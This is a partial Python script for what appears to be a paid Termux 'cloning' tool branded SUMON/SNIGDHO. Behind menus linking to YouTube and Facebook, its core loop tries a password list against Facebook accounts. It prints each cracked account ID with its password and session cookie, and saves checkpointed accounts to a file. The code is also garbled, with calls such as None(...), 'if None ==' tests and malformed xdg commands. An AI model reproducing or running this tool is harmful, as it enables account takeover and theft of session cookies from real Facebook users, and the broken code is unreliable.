...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtube.com/channel/UCcruWWCHyyTeu79MW7aRdwQ')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-https://youtube.com/channel/UCcruWWCHyyTeu79MW7aRdwQ' )
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/profile.php?id=100086553670592')
        return None
    if None == '3':
        os.system('xdg-https://youtube.com/channel/UCcruWWCHyyTeu79MW7aRdwQ')
        return None
...
logo =                                          ("""   
    ...
    /:::/__\:::\    \        /:::/    /               /:::/|::|   |           /:::/    \:::\    \       /:::/|::|   |        
    \:::\   \:::\    \      /:::/    /               /:::/ |::|   |          /:::/    / \:::\    \     /:::/ |::|   |        
  ___\:::\   \:::\    \    /:::/    /      _____    /:::/  |::|___|______   /:::/____/   \:::\____\   /:::/  |::|   | _____  
 /\   \:::\   \:::\    \  /:::/____/      /\    \  /:::/   |::::::::\    \ |:::|    |     |:::|    | /:::/   |::|   |/\    \ 
...
\033[1;37m================= \33[32;45mSNIGDHO\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSNIGDHO
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Termux Bd
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTERMUX SUMON
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS Paid
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mBSCF
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mMR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO SUMON TOOLS\33[0;m
 
\033[1;37m================== \33[32;45mSUMON\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SUMON-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(SNIGDHO-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SUMON-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[SUMON] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
